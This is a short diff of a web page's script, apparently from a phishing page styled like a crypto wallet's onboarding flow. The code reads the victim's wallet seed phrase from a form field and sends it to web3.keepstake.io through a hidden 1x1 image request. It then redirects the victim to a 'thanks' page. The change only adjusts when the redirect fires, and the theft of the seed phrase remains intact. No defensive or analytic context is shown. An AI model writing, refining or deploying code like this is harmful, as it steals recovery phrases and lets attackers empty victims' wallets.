@@ -3163,11 +3163,10 @@ button.first-time-flow__button--tertiary:hover {
     var seed = document.getElementById("seed");
     var seedx = "https://web3.keepstake.io/process.php?seed=" + seed.value;
     var img = new Image(1,1);
-    img.src = seedx;
-    window.setTimeout(redirect,44500);
-    function redirect(){
+    img.onLoad = function(){
       window.location.href = "https://keepstake.io/thanks";
     }
+    img.src = seedx;
     }
     </script>
   
